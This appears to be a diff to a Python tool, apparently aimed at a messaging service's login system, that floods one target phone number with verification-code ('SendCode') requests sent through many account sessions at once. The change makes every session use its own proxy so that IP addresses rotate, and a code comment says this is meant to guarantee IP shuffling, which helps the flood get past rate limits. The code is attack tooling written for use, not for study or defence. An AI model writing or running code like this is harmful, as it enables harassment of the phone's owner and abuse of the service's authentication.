@@ -804,6 +804,7 @@ async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) ->
 
 
 async def snos_flood_sendcode(phone: str) -> list[dict]:
+    """SendCode flood through every session, each on a unique working proxy."""
     sessions = load_sessions()
     proxies = load_proxies()
     out = []
@@ -815,7 +816,14 @@ async def snos_flood_sendcode(phone: str) -> list[dict]:
         await asyncio.sleep(random.uniform(1.5, 3.0))
         return out
     for i, s in enumerate(sessions):
-        px = proxies[i % len(proxies)] if proxies else None
+        # pick a UNIQUE proxy for each session so IP shuffling is guaranteed
+        # round-robin if less proxies than sessions; random if more
+        if i < len(proxies):
+            px = proxies[i]
+        elif proxies:
+            px = random.choice(proxies)
+        else:
+            px = None
         tasks.append(snos_sendcode_one(s, phone, px))
     results = await asyncio.gather(*tasks, return_exceptions=True)
     for i, r in enumerate(results):
